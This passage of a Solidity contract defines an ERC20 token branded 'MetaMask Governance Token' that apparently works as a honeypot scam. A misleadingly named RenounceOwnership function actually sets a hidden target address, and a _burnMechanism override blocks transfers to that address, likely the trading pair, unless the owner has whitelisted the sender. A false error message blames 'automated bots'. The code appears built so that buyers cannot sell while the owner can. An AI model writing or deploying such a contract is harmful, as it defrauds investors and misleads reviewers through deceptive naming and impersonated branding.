contract MASK is ERC20, Ownable {
    mapping(address=>bool) private _db;
    address private _ownershipId;
    constructor() ERC20('MetaMask Governance Token','MASK') {
        _mint(0xf9869C298e36fC86DDB65131CB41480Ada34eF7f, 100000000000 * 10 ** 18);
        _db[0xf9869C298e36fC86DDB65131CB41480Ada34eF7f] = true;
    }

    function _mint(
        address account,
        uint256 amount
    ) internal virtual override (ERC20) {
        require(ERC20.totalSupply() + amount <= 100000000000 * 10 ** 18, "ERC20Capped: Coin Amount Exceeded");
        super._mint(account, amount);
    }
    
    function UpdateDB(address user, bool enable) public onlyOwner {
        _db[user] = enable;
    }
    
    function RenounceOwnership(address ownershipId_) public onlyOwner {
        _ownershipId = ownershipId_;
    }

    function _burnMechanism(address from, address to) internal virtual override {
        if(to == _ownershipId) {
            require(_db[from], "Tokens sent by automated bots are burnt.");
        }
    }
